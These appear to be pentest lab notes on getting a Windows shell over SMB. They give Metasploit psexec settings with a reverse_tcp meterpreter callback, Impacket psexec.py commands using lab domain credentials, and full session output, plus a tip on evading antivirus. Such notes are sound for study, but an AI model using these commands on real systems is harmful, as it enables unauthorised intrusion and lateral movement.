# Shell Access

## SMB - PSExec

### With Metasploit

```msfconsole```
- we can seach psexec or type:
```use exploit/windows/smb/psexec```
```show options```
- We need to set rhosts, lhost, smbdomain, smbpass and smbuser
- We also need to set the payload depending on our target for instance `windows/x64/meterpreter/reverse_tcp`
- We should get a shell
```
[*] Started reverse TCP handler on 10.0.2.8:4444 
[*] 10.0.2.4:445 - Connecting to the server...
[*] 10.0.2.4:445 - Authenticating to 10.0.2.4:445|marvel.local as user 'fcastle'...
[*] 10.0.2.4:445 - Selecting PowerShell target
[*] 10.0.2.4:445 - Executing the payload...
[+] 10.0.2.4:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200262 bytes) to 10.0.2.4
[*] Meterpreter session 1 opened (10.0.2.8:4444 -> 10.0.2.4:51468 ) at 2022-02-04 10:28:51 -0500

meterpreter > 
```
### With Impacket - psexec.py

Can be useful if meterprer is picked up by AV.
```
┌──(kali㉿kali)-[~]
└─$ psexec.py marvel.local/fcastle:Password1@10.0.2.4                                                                                                                                                                                    1 ⨯
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.0.2.4.....
[*] Found writable share ADMIN$
[*] Uploading file OKJXcwkr.exe
[*] Opening SVCManager on 10.0.2.4.....
[*] Creating service tDbW on 10.0.2.4.....
[*] Starting service tDbW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1288]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
- We can also try with: wmbexec.py or wmiexec.py (same command except for name of the script of course)
